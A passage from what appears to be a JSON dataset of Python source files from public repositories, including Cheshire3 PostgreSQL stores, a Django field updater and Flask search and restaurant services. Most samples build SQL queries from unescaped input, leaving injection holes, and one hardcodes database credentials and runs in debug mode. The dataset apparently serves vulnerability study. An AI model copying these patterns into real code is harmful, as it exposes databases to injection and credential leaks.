(self.idNormalizer is not None):\n            sid = self.idNormalizer.process_string(session, sid)\n        query = (\"SELECT data FROM %s WHERE identifier = '%s';\" %\n                 (self.table, sid)\n                 )\n        res = self._query(query)\n        try:\n            data = res.dictresult()[0]['data']\n        except IndexError:\n            raise ObjectDoesNotExistException(id)\n        try:\n            ndata = pg.unescape_bytea(data)\n        except:\n            # insufficient PyGreSQL version\n            ndata = data.replace(\"\\\\'\", \"'\")\n\n        ndata = ndata.replace('\\\\000\\\\001', nonTextToken)\n        ndata = ndata.replace('\\\\012', '\\n')\n        return ndata\n\n    def delete_data(self, session, id):\n        self._openContainer(session)\n        sid = str(id)\n        if (self.idNormalizer is not None):\n            sid = self.idNormalizer.process_string(session, str(id))\n        query = \"DELETE FROM %s WHERE identifier = '%s';\" % (self.table, sid)\n        self._query(query)\n        return None\n\n    def fetch_metadata(self, session, id, mType):\n        if (self.idNormalizer is not None):\n            id = self.idNormalizer.process_string(session, id)\n        elif type(id) == unicode:\n            id = id.encode('utf-8')\n        else:\n            id = str(id)\n        self._openContainer(session)\n        query = (\"SELECT %s FROM %s WHERE identifier = '%s';\" %\n                 (mType, self.table, id)\n                 )\n        res = self._query(query)\n        try:\n            data = res.dictresult()[0][mtype]\n        except:\n            if mtype.endswith((\"Count\", \"Position\", \"Amount\", \"Offset\")):\n                return 0\n            return None\n        return data\n\n    def store_metadata(self, session, key, mType, value):\n        if (self.idNormalizer is not None):\n            id = self.idNormalizer.process_string(session, id)\n        elif type(id) == unicode:\n            id = id.encode('utf-8')\n        else:\n            id = str(id)\n        self._openContainer(session)\n        query = (\"UPDATE %s SET %s = %r WHERE identifier = '%s';\" %\n                 (self.table, mType, value, id)\n                 )\n        try:\n            self._query(query)\n        except:\n            return None\n        return value\n\n    def clear(self, session):\n        self._openContainer(session)\n        query = \"DELETE FROM %s\" % (self.table)\n        self._query(query)\n\n    def clean(self, session):\n        # here is where sql is nice...\n        self._openContainer(session)\n        nowStr = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.gmtime(time.time()))\n        query = \"DELETE FROM %s WHERE expires < '%s';\" % (self.table, nowStr)\n        self._query(query)\n\n    def get_dbSize(self, session):\n        query = \"SELECT count(identifier) AS count FROM %s;\" % (self.table)\n        res = self._query(query)\n        return res.dictresult()[0]['count']\n\n    def link(self, session, relation, *args, **kw):\n        \"\"\"Create a new row in the named relation.\n\n        NOT API\n        \"\"\"\n        fields = []\n        values = []\n        for obj in args:\n            #fields.append(obj.recordStore)\n            # Allows to link for objects other than Records\n            fields.append(self.table)\n            oid = obj.id\n            if (self.idNormalizer):\n                oid = self.idNormalizer.process_string(session, oid)\n            values.append(repr(oid))\n        for (name, value) in kw.iteritems():\n            fields.append(name)\n            if isinstance(value, basestring) and value.find(\"'\") > -1:\n                values.append(\"'{0}'\".format(value.replace(\"'\", r\"\\'\")))\n            else:\n                values.append(repr(value))\n\n        query = (\"INSERT INTO %s_%s (%s) VALUES (%s);\" %\n                 (self.table, relation, ', '.join(fields), ', '.join(values))\n                 )\n        self._query(query)\n\n    def unlink(self, session, relation, *args, **kw):\n        \"\"\"Remove a row in the named relation.\n\n        NOT API\n        \"\"\"\n        conds = []\n        for obj in args:\n            oid = obj.id\n            if (self.idNormalizer):\n                oid = self.idNormalizer.process_string(session, oid)\n            #cond += (\"%s = %r, \" % (obj.recordStore, oid))\n            # Allows to unlink for objects other than Records\n            conds.append(\"%s = %r\" % (self.table, oid))\n        for (name, value) in kw.iteritems():\n            conds.append(\"%s = %r\" % (name, value))\n        query = (\"DELETE FROM %s_%s WHERE %s;\" %\n                 (self.table, relation, ' AND '.join(conds))\n                 )\n        self._query(query)\n\n    def get_links(self, session, relation, *args, **kw):\n        \"\"\"Get linked rows in the named relation.\n\n        NOT API\n        \"\"\"\n        conds = []\n        for obj in args:\n            oid = obj.id\n            if (self.idNormalizer):\n                oid = self.idNormalizer.process_string(session, oid)\n            #cond += (\"%s = %r, \" % (obj.recordStore, oid))\n            # Allows get_links for objects other than Records\n            conds.append(\"%s = %r\" % (self.table, oid))\n        for (name, value) in kw.iteritems():\n            conds.append(\"%s = %r\" % (name, value))\n        query = (\"SELECT * FROM %s_%s WHERE %s;\" %\n                 (self.table, relation, ', '.join(conds))\n                 )\n        res = self._query(query)\n\n        links = []\n        reln = self.relations[relation]\n        for row in res.getresult():\n            link = []\n            linkHash = {}\n            for i in range(len(row)):\n                name = reln[i - 1][0]\n                if (reln[i - 1][2]):\n                    link.append(SimpleResultSetItem(session, row[i], name))\n                else:\n                    linkHash[name] = row[i]\n\n            links.append((link, linkHash))\n        return links\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cheshire3/cheshire3/blob/2a358b8a906b873791e75aef81030f4f80e55fc3",
        "file_path": "/cheshire3/sql/resultSetStore.py",
        "source": "\"\"\"ResultSetStore Implementations.\"\"\"\n\nimport pg\nimport time\n\nfrom cheshire3 import dynamic\nfrom cheshire3.exceptions import *\nfrom cheshire3.resultSetStore import SimpleResultSetStore\nfrom cheshire3.sql.postgresStore import PostgresIter, PostgresStore\n\n\nclass PostgresResultSetStore(PostgresStore, SimpleResultSetStore):\n    \"\"\"PostgreSQL ResultSetStore implementation.\"\"\"\n\n    _possibleSettings = {\n        'overwriteOkay': {\n            'docs': ('Can resultSets in this store be overwritten by a '\n                     'resultSet with the same identifier. NB if the item '\n                     'membership or order of a resultSet change, then the '\n                     'resultSet is fundamentally altered and should be '\n                     'assigned a new identifier. A stored resultSet should '\n                     'NEVER be overwritten by one that has different items '\n                     'or ordering!. 1 = Yes, 0 = No (default).'),\n            'type': int,\n            'options': \"0|1\"\n        }\n    }\n\n    def __init__(self, session, node, parent):\n        SimpleResultSetStore.__init__(self, session, node, parent)\n        PostgresStore.__init__(self, session, node, parent)\n\n    def _verifyDatabases(self, session):\n        # Custom resultSetStore table\n        try:\n            #self.cxn = pg.connect(self.database)\n            self._openContainer(session)\n        except pg.InternalError as e:\n            raise ConfigFileException(\"Cannot connect to Postgres: %r\" %\n                                      e.args\n                                      )\n        try:\n            query = \"SELECT identifier FROM %s LIMIT 1\" % self.table\n            res = self._query(query)\n        except pg.ProgrammingError as e:\n            # no table for self, initialise\n            query = \"\"\"\n            CREATE TABLE %s (identifier VARCHAR PRIMARY KEY,\n            data BYTEA,\n            size INT,\n            class VARCHAR,\n            timeCreated TIMESTAMP,\n            timeAccessed TIMESTAMP,\n            expires TIMESTAMP);\n            \"\"\" % self.table\n            self._query(query)\n            # rs.id, rs.serialise(), digest, len(rs),\n            # rs.__class__, now, expireTime\n            # NB: rs can't be modified\n\n        # And check additional relations\n        for (name, fields) in self.relations.iteritems():\n            try:\n                query = (\"SELECT identifier FROM %s_%s LIMIT 1\" %\n                         (self.table, name)\n                         )\n                res = self._query(query)\n            except pg.ProgrammingError as e:\n                # No table for relation, initialise\n                query = (\"CREATE TABLE %s_%s \"\n                         \"(identifier SERIAL PRIMARY KEY, \" %\n                         (self.table, name)\n                         )\n                for f in fields:\n                    query += (\"%s %s\" % (f[0], f[1]))\n                    if f[2]:\n                        # Foreign Key\n                        query += (\" REFERENCES %s (identifier)\" % f[2])\n                    query += \", \"\n                query = query[:-2] + \");\"\n                res = self._query(query)\n\n    def store_data(self, session, id_, data, size=0):\n        # Should call store_resultSet\n        raise NotImplementedError\n\n    def create_resultSet(self, session, rset):\n        id_ = self.generate_id(session)\n        rset.id = id_\n        rset.retryOnFail = 1\n        self.store_resultSet(session, rset)\n        return id_\n\n    def store_resultSet(self, session, rset):\n        self._openContainer(session)\n        now = time.time()\n        nowStr = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.gmtime(now))\n        if (rset.expires):\n            expires = now + rset.expires\n        else:\n            expires = now + self.get_default(session, 'expires', 600)\n        rset.timeExpires = expires\n        expiresStr = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.gmtime(expires))\n        id = rset.id\n        if (self.idNormalizer is not None):\n            id = self.idNormalizer.process_string(session, id)\n\n        # Serialise and store\n        srlz = rset.serialize(session)\n        cl = '.'.join((rset.__class__.__module__, rset.__class__.__name__))\n        data = srlz.replace('\\x00', '\\\\\\\\000')\n        try:\n            ndata = pg.escape_bytea(data)\n        except:\n            # insufficient PyGreSQL version - do the best we can\n            ndata = data.replace(\"'\", \"\\\\'\")\n\n        query = (\"INSERT INTO %s (identifier, data, size, class, \"\n                 \"timeCreated, timeAccessed, expires) VALUES \"\n                 \"('%s', '%s', %s, '%s', '%s', '%s', '%s')\" %\n                 (self.table,\n                  id,\n                  ndata,\n                  len(rset),\n                  cl,\n                  nowStr,\n                  nowStr,\n                  expiresStr\n                  )\n                 )\n        try:\n            self._query(query)\n        except pg.ProgrammingError as e:\n            # already exists, retry for overwrite, create\n            if self.get_setting(session, 'overwriteOkay', 0):\n                query = (\"UPDATE %s SET data = '%s', size = %s, \"\n                         \"class = '%s', timeAccessed = '%s', expires = '%s' \"\n                         \"WHERE identifier = '%s';\" %\n                         (self.table,\n                          ndata,\n                          len(rset),\n                          cl,\n                          nowStr,\n                          expiresStr,\n                          id\n                          )\n                         )\n                self._query(query)\n            elif hasattr(rset, 'retryOnFail'):\n                # generate new id, re-store\n                id = self.generate_id(session)\n                if (self.idNormalizer is not None):\n                    id = self.idNormalizer.process_string(session, id)\n                query = (\"INSERT INTO %s (identifier, data, size, class, \"\n                         \"timeCreated, timeAccessed, expires) VALUES \"\n                         \"('%s', '%s', %s, '%s', '%s', '%s', '%s')\" %\n                         (self.table,\n                          id,\n                          ndata,\n                          len(rset),\n                          cl,\n                          nowStr,\n                          nowStr,\n                          expiresStr\n                          )\n                         )\n                self._query(query)\n            else:\n                raise ObjectAlreadyExistsException(self.id + '/' + id)\n        return rset\n\n    def fetch_resultSet(self, session, id):\n        self._openContainer(session)\n\n        sid = str(id)\n        if (self.idNormalizer is not None):\n            sid = self.idNormalizer.process_string(session, sid)\n        query = (\"SELECT class, data FROM %s WHERE identifier = '%s';\" %\n                 (self.table, sid)\n                 )\n        res = self._query(query)\n        try:\n            rdict = res.dictresult()[0]\n        except IndexError:\n            raise ObjectDoesNotExistException('%s/%s' % (self.id, sid))\n\n        data = rdict['data']\n        try:\n            ndata = pg.unescape_bytea(data)\n        except:\n            # Insufficient PyGreSQL version\n            ndata = data.replace(\"\\\\'\", \"'\")\n\n        ndata = ndata.replace('\\\\000', '\\x00')\n        ndata = ndata.replace('\\\\012', '\\n')\n        # data is res.dictresult()\n        cl = rdict['class']\n        rset = dynamic.buildObject(session, cl, [[]])\n        rset.deserialize(session, ndata)\n        rset.id = id\n\n        # Update expires\n        now = time.time()\n        nowStr = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.gmtime(now))\n        expires = now + self.get_default(session, 'expires', 600)\n        rset.timeExpires = expires\n        expiresStr = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.gmtime(expires))\n\n        query = (\"UPDATE %s SET timeAccessed = '%s', expires = '%s' \"\n                 \"WHERE identifier = '%s';\" %\n                 (self.table, nowStr, expiresStr, sid)\n                 )\n        self._query(query)\n        return rset\n\n    def delete_resultSet(self, session, id):\n        self._openContainer(session)\n        sid = str(id)\n        if (self.idNormalizer is not None):\n            sid = self.idNormalizer.process_string(session, sid)\n        query = \"DELETE FROM %s WHERE identifier = '%s';\" % (self.table, sid)\n        self._query(query)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cheshire3/cheshire3/blob/2a358b8a906b873791e75aef81030f4f80e55fc3",
        "file_path": "/setup.py",
        "source": "\"\"\"Setup file for cheshire3 package.\"\"\"\nfrom __future__ import with_statement\n\nimport sys\nimport os\nimport inspect\n\nfrom warnings import warn\n\n# Import Distribute / Setuptools\nimport distribute_setup\ndistribute_setup.use_setuptools()\nfrom setuptools import setup, find_packages\nfrom pkg_resources import DistributionNotFound\n\n# Check Python version\npy_version = getattr(sys, 'version_info', (0, 0, 0))\n\nif py_version < (2, 6):\n    warn(\"Cheshire3 requires Python 2.6 or later; some code may be \"\n         \"incompatible with earlier versions.\")\n\n# Inspect to find current path\nsetuppath = inspect.getfile(inspect.currentframe())\nsetupdir = os.path.dirname(setuppath)\n\n# Basic information\n_name = 'cheshire3'\n_description = ('Cheshire3 Search and Retrieval Engine and Information '\n                'Framework')\n# Discover version number from file    \nwith open(os.path.join(setupdir, 'VERSION.txt'), 'r') as vfh:\n    _version = vfh.read().strip()\n\n_download_url = ('http://download.cheshire3.org/{0}/src/{1}-{2}.tar.gz'\n                 ''.format(_version[:3], _name, _version))\n\n# More detailed description from README\ntry:\n    fh = open(os.path.join(setupdir, 'README.rst'), 'r')\nexcept IOError:\n    _long_description = ''\nelse:\n    _long_description = fh.read()\n    fh.close()\n\n# Requirements\nwith open(os.path.join(setupdir, 'requirements.txt'), 'r') as fh:\n    _install_requires = fh.readlines()\n_tests_require = []\n# Determine python-dateutil version\nif py_version < (3, 0):\n    dateutilstr = 'python-dateutil == 1.5'\n    if py_version < (2, 7):\n        _install_requires.append('argparse')\n        _tests_require.append('unittest2')\nelse:\n    dateutilstr = 'python-dateutil >= 2.0'\n\n_install_requires.append(dateutilstr)\n\n\nsetup(\n    name=_name,\n    version=_version,\n    packages=[_name],\n    include_package_data=True,\n    package_data={'cheshire3': ['configs/*.xml', 'configs/extra/*.xml']},\n    exclude_package_data={'': ['README.*', '.gitignore']},\n    requires=['lxml(>=2.1)', 'bsddb', 'dateutil', 'argparse'],\n    tests_require=_tests_require,\n    install_requires=_install_requires,\n    setup_requires=['setuptools-git'],\n    dependency_links=[\n        \"http://labix.org/python-dateutil\",\n        \"http://www.panix.com/~asl2/software/PyZ3950/\",\n        \"http://download.cheshire3.org/latest/reqs/\"\n    ],\n    extras_require={\n        'graph': ['rdflib'],\n        'datamining': ['svm'],\n        'lucene': ['lucene'],\n        'sql': ['PyGreSQL >= 3.8.1'],\n        'textmining': ['numpy', 'nltk >= 2.0'],\n        'web': ['pyoai', 'PyZ3950 >= 2.04', 'ZSI < 2.0']\n    },\n    test_suite=\"cheshire3.test.testAll.suite\",\n    scripts=['scripts/DocumentConverter.py'],\n    entry_points={\n        'console_scripts': [\n            'cheshire3 = cheshire3.commands.console:main',\n            'cheshire3-init = cheshire3.commands.init:main',\n            'cheshire3-load = cheshire3.commands.load:main',\n            'cheshire3-register = cheshire3.commands.register:main',\n            'cheshire3-search = cheshire3.commands.search:main',\n            'cheshire3-serve = cheshire3.commands.serve:main'\n        ],\n    },\n    keywords=\"xml document search information retrieval engine data text\",\n    description=_description,\n    long_description=_long_description,\n    author=\"Rob Sanderson, et al.\",\n    author_email=\"azaroth@liv.ac.uk\",\n    maintainer='John Harrison',\n    maintainer_email='john.harrison@liv.ac.uk',\n    license=\"BSD\",\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Topic :: Internet :: WWW/HTTP :: Indexing/Search\",\n        \"Topic :: Internet :: WWW/HTTP :: WSGI :: Application\",\n        \"Topic :: Internet :: Z39.50\",\n        \"Topic :: Text Processing :: Indexing\",\n        \"Topic :: Text Processing :: Linguistic\",\n        \"Topic :: Text Processing :: Markup\"\n    ],\n    url=\"http://www.cheshire3.org/\",\n    download_url=_download_url\n)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nunkung3/browsershots/blob/c72bb5ea7aa52db4922f73a0cc7f50bddfff921a",
        "file_path": "/shotserver/shotserver04/common/granular_update.py",
        "source": "# browsershots.org - Test your web design in different browsers\n# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>\n#\n# Browsershots is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3 of the License, or\n# (at your option) any later version.\n#\n# Browsershots is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"\nUpdate only selected fields of a model.\n\nThe problem with model.save() is that it also overwrites all other\nfields with possibly stale data.\n\"\"\"\n\n__revision__ = \"$Rev$\"\n__date__ = \"$Date$\"\n__author__ = \"$Author$\"\n\nfrom django.db import connection, models, transaction\n\n\ndef update_fields(self, **kwargs):\n    \"\"\"\n    Update selected model fields in the database, but leave the other\n    fields alone. Use this rather than model.save() for performance\n    and data consistency.\n\n    You can use this as a function or add it as a method to your models:\n    import granular_update\n    class Example(models.Model):\n        name = models.CharField(max_length=20)\n        number = models.IntegerField()\n        update_fields = granular_update.update_fields\n    \"\"\"\n    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']\n    for field_name in kwargs:\n        setattr(self, field_name, kwargs[field_name])\n        field = self._meta.get_field(field_name)\n        value = field.get_db_prep_save(kwargs[field_name])\n        if isinstance(value, basestring):\n            value = \"'%s'\" % value.encode('utf-8').replace('\\\\', r'\\\\')\n        elif isinstance(value, models.Model):\n            value = str(value.id)\n        elif value is None:\n            value = 'NULL'\n        else:\n            value = str(value)\n        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))\n    sql.pop(-1) # Remove the last comma\n    sql.extend(['WHERE', 'id', '=', str(self.id)])\n    sql = ' '.join(sql)\n    connection.cursor().execute(sql)\n    transaction.commit_unless_managed()\n\n\nupdate_fields.alters_data = True\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/samin-hireindians/browsershots/blob/c72bb5ea7aa52db4922f73a0cc7f50bddfff921a",
        "file_path": "/shotserver/shotserver04/common/granular_update.py",
        "source": "# browsershots.org - Test your web design in different browsers\n# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>\n#\n# Browsershots is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3 of the License, or\n# (at your option) any later version.\n#\n# Browsershots is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"\nUpdate only selected fields of a model.\n\nThe problem with model.save() is that it also overwrites all other\nfields with possibly stale data.\n\"\"\"\n\n__revision__ = \"$Rev$\"\n__date__ = \"$Date$\"\n__author__ = \"$Author$\"\n\nfrom django.db import connection, models, transaction\n\n\ndef update_fields(self, **kwargs):\n    \"\"\"\n    Update selected model fields in the database, but leave the other\n    fields alone. Use this rather than model.save() for performance\n    and data consistency.\n\n    You can use this as a function or add it as a method to your models:\n    import granular_update\n    class Example(models.Model):\n        name = models.CharField(max_length=20)\n        number = models.IntegerField()\n        update_fields = granular_update.update_fields\n    \"\"\"\n    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']\n    for field_name in kwargs:\n        setattr(self, field_name, kwargs[field_name])\n        field = self._meta.get_field(field_name)\n        value = field.get_db_prep_save(kwargs[field_name])\n        if isinstance(value, basestring):\n            value = \"'%s'\" % value.encode('utf-8').replace('\\\\', r'\\\\')\n        elif isinstance(value, models.Model):\n            value = str(value.id)\n        elif value is None:\n            value = 'NULL'\n        else:\n            value = str(value)\n        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))\n    sql.pop(-1) # Remove the last comma\n    sql.extend(['WHERE', 'id', '=', str(self.id)])\n    sql = ' '.join(sql)\n    connection.cursor().execute(sql)\n    transaction.commit_unless_managed()\n\n\nupdate_fields.alters_data = True\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/gdosreis/browsershots/blob/c72bb5ea7aa52db4922f73a0cc7f50bddfff921a",
        "file_path": "/shotserver/shotserver04/common/granular_update.py",
        "source": "# browsershots.org - Test your web design in different browsers\n# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>\n#\n# Browsershots is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3 of the License, or\n# (at your option) any later version.\n#\n# Browsershots is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"\nUpdate only selected fields of a model.\n\nThe problem with model.save() is that it also overwrites all other\nfields with possibly stale data.\n\"\"\"\n\n__revision__ = \"$Rev$\"\n__date__ = \"$Date$\"\n__author__ = \"$Author$\"\n\nfrom django.db import connection, models, transaction\n\n\ndef update_fields(self, **kwargs):\n    \"\"\"\n    Update selected model fields in the database, but leave the other\n    fields alone. Use this rather than model.save() for performance\n    and data consistency.\n\n    You can use this as a function or add it as a method to your models:\n    import granular_update\n    class Example(models.Model):\n        name = models.CharField(max_length=20)\n        number = models.IntegerField()\n        update_fields = granular_update.update_fields\n    \"\"\"\n    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']\n    for field_name in kwargs:\n        setattr(self, field_name, kwargs[field_name])\n        field = self._meta.get_field(field_name)\n        value = field.get_db_prep_save(kwargs[field_name])\n        if isinstance(value, basestring):\n            value = \"'%s'\" % value.encode('utf-8').replace('\\\\', r'\\\\')\n        elif isinstance(value, models.Model):\n            value = str(value.id)\n        elif value is None:\n            value = 'NULL'\n        else:\n            value = str(value)\n        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))\n    sql.pop(-1) # Remove the last comma\n    sql.extend(['WHERE', 'id', '=', str(self.id)])\n    sql = ' '.join(sql)\n    connection.cursor().execute(sql)\n    transaction.commit_unless_managed()\n\n\nupdate_fields.alters_data = True\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/astenstrasser/udacity_courses/blob/326c0a808c24e486060bfa69765d4e3a10fedec8",
        "file_path": "/relational-databases/forum_db.py",
        "source": "# \"Database code\" for the DB Forum.\n\nimport datetime\nimport psycopg2\n\nPOSTS = [(\"This is the first post.\", datetime.datetime.now())]\n\n\ndef get_posts():\n    data_base = psycopg2.connect(\"dbname=forum\")\n    cursor = data_base.cursor()\n    cursor.execute('select content, time from posts order by time desc')\n    POSTS = cursor.fetchall()\n    data_base.close()\n    return POSTS\n\n\ndef add_post(content):\n    data_base = psycopg2.connect(\"dbname=forum\")\n    cursor = data_base.cursor()\n    cursor.execute(\"insert into posts values (%s)\", (content,))\n    data_base.commit()\n    data_base.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Angelyr/Ranking/blob/fd61d45fc378a77dfec7d7dae8759b407164b521",
        "file_path": "/MessageHandler.py",
        "source": "from flask import Flask, request, jsonify\nimport time\nimport requests\nimport json\n\nfrom TextProcessing import makeNGrams\nfrom Ranking import Ranking\n\n# for postgres index team\nimport psycopg2\nimport pprint\n\n# for spoofing index\nimport random\nrandom.seed(500)\n\n\napp = Flask(__name__)\n\n\n# Global psql connection vars\n# connect to postgresql index team\nconn_string = \"host='green-z.cs.rpi.edu' dbname='index' user='ranking' password='ranking'\"\nconn = psycopg2.connect(conn_string)\nconn.autocommit = True\ncursor = conn.cursor()\n\n\n# Receives the UI team's query and calls getRanking to get ranking results\n# INPUT: User's query comes from \"query\" value in url \n# OUPUT: Returns the ranked list json to the front-end\n@app.route('/search', methods=['GET'])\ndef recvQuery():\n\n\tprint(\"in rec query\")\n\n\temptyRes = {}\n\temptyRes[\"pages\"] = []\n\n\tprint(request.args.get('query'))\n\n\tquery = request.args.get('query')\n\n\tif not query:\n\t\treturn jsonify(emptyRes)\n\n\n\tquery = query.lower()\n\n\trankedList = getRanking(query)\n\t\n\treturn jsonify(rankedList)\n\n\n\t\n\n\n# Dummy endpoint for spoofing index service\n@app.route('/index', methods=['POST'])\ndef spoofIndex():\n\n\tprint(request.form)\n\n\tspoofFeatures = {}\n\n\tspoofFeatures['document_id'] = random.randint(1,10000)\n\tspoofFeatures['pagerank'] =\trandom.random()\n\tspoofFeatures['position'] = random.random()\n\tspoofFeatures['frequency'] = random.random()\n\tspoofFeatures['section'] = \"body\"\n\tspoofFeatures['date_created'] = \"2018-11-05T16:18:03+0000\"\n\n\tspoofDocuments = {}\n\tspoofDocuments[\"documents\"] = []\n\tspoofDocuments[\"documents\"].append(spoofFeatures)\n\n\treturn jsonify(spoofDocuments)\n\n\n\n\n# Takes in the user query, calls text processing and ranking layers to rank the query and returns a sorted ranked list\n# INPUT: query - user's query string send from UI team\n# OUTPUT: rankedList - sorted ranked list of documents \ndef getRanking(query):\n\t\n\t# Call other file to get the n-grams\n\tngrams = makeNGrams(query)\n\tprint(ngrams)\n\t# create a ranking class to keep track of the ngram features\n\tranking = Ranking()\n\tids = set()\n\n\tfor ngram in ngrams:\n\t\t# Send the nNgrams to the Index team to get the document features\n\t\trecords = sendIndexReq( \" \".join(ngram) )\n\t\tranking.addNgram(records)\n\n\t\tfor record in records:\n\t\t\tids.add(record[1])\n\n\t# Get the additional statisitics based on the ids from the separate table\n\tadditionalStatList = sendIndexDocumentReq(ids)\n\tfor additionalStat in additionalStatList:\n\t\tranking.addMoreStats(additionalStat)\n\n\t# Calculate the ranks within the ranking class\n\trankedList = ranking.getDocuments()\n\n\treturn rankedList\n\n\n# Sends the database request to the index team to return the document features for the given ngram\n# INPUT: ngram - string of the ngram\n# OUTPUT: records - a list of tuples representing the statistics returned from the reverse inex from the index team\ndef sendIndexReq(nGram):\n\t\n\n\ttry:\n\t\tprint(nGram)\n\t\tsql = \"SELECT * FROM index WHERE ngram='\" + nGram + \"';\"\n\n\t\tcursor.execute(sql)\n\t\trecords = cursor.fetchall()\n\texcept Exception as ex:\n\t\tprint(ex)\n\n\t\treturn []\n\n\n\treturn records\n\n# Send the database request to the index team to get the document statistics for a set of document ids\n# INPUT: ids - list of document ids as integers\n# OUTPUT: records - a list of tuples representing the statistics returned from the database (id, pagerank, date_updated)\ndef sendIndexDocumentReq(ids):\n\n\tidStrList = \",\"\n\tidStrList = idStrList.join( list( map(str, ids) ) )\n\n\ttry:\n\n\t\tsql = \"SELECT id, pagerank, date_updated FROM documents WHERE id IN (\" + idStrList + \");\"\n\t\t# sql = \"SELECT id, norm_pagerank, date_updated FROM documents WHERE id IN (\" + idStrList + \");\"\n\t\tcursor.execute(sql)\n\t\trecords = cursor.fetchall()\n\texcept Exception as ex:\n\t\tprint(ex)\n\t\treturn []\n\n\treturn records\n\n\n\nif __name__ == \"__main__\":\n\t# @TODO remove debug before production\n\tapp.run(debug=True, host='0.0.0.0', port=5000)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RamFlo/DBSystems/blob/9c5e8f881245c4ac5019f63cf2f92b2f44806023",
        "file_path": "/SRC/APPLICATION-SOURCE-CODE/server.py",
        "source": "from flask import Flask, request\nfrom db import Database\nfrom datetime import datetime, timedelta\nfrom log import Logger\nimport sql_queries\nimport simplejson\n\nlogger = Logger().logger \napp = Flask(__name__)\nport_number = 40327\n\ndatabase = Database()\n\ncuisine_discovery_cache = {}\nunique_ingredients_cache = {}\ncache_persistence_time = timedelta(days=1)\n\ngeodist = 0.12  # used for restaurant geosearching - defines L1 radius\n\n@app.before_request\ndef log_request():\n    return  # TODO: add request logger\n\n\n@app.route('/')\ndef index():\n    return app.send_static_file('TheFoodCourt.html')\n\n\n@app.route('/ingredient_prefix/<string:prefix>')\ndef get_ingredient_by_prefix(prefix):\n    query_res = database.find_ingredients_by_prefix(prefix)\n    if query_res == -1:\n        return None\n    logger.info(\"GET get_ingredient_by_prefix query\")\n    return query_res\n\n\n@app.route('/get_cuisines')\ndef get_cuisines():\n    query_res = database.get_cuisines()\n    if query_res == -1:\n        return None\n    logger.info(\"GET get_cuisines query\")\n    return query_res\n\n\n@app.route('/discover_new_cuisines/<int:cuisine_id>')\ndef discover_new_cuisines(cuisine_id):\n    logger.info(\"GET discover_new_cuisines query\")\n    if cuisine_id in cuisine_discovery_cache:\n        insert_time, data = cuisine_discovery_cache[cuisine_id]\n        if datetime.now() < insert_time + cache_persistence_time:\n            return data\n\n    query_res = database.discover_new_cuisines_from_cuisine(cuisine_id)\n    if query_res == -1:\n        return None\n    cuisine_discovery_cache[cuisine_id] = (datetime.now(), query_res)\n    return query_res\n\n\n@app.route('/restaurants/<ingredient>/')\ndef query_restaurants_by_ingredient(ingredient):\n    \"\"\"\n    To query this method, use :\n    '/restaurants/<ingredient>/?key=value&key=value&...' where keys are optional\n    strings from ['loclat', 'loclng', 'price_category', 'online_delivery', 'min_review']\n    for example: '/restaurants/flour/?min_review=3.5&price_category=2'\n    \"\"\"\n    logger.info(\"GET query_restaurants_by_ingredient query\")\n    loclat, loclng = request.args.get('loclat'), request.args.get('loclng')\n    price_category = request.args.get('price_category')\n    online_delivery = request.args.get('online_delivery')\n    min_review = request.args.get('min_review')\n    base_query = sql_queries.restaurants_by_ingredient % ingredient\n    if loclat != None and loclng != None:\n        lat_range = [float(loclat) - geodist, float(loclat) + geodist]\n        lng_range = [float(loclng) - geodist, float(loclng) + geodist]\n    else:\n        lat_range = None\n        lng_range = None\n    filtered_query = database.restaurant_query_builder(base_query,\n                                                       lat_range, lng_range,\n                                                       price_category,\n                                                       min_review, online_delivery)\n    limited_query = database.order_by_and_limit_query(filtered_query,\n                                                    \"agg_review DESC\", 20)\n    query_res = database.run_sql_query(limited_query)\n    if query_res == -1:\n        return None\n    return 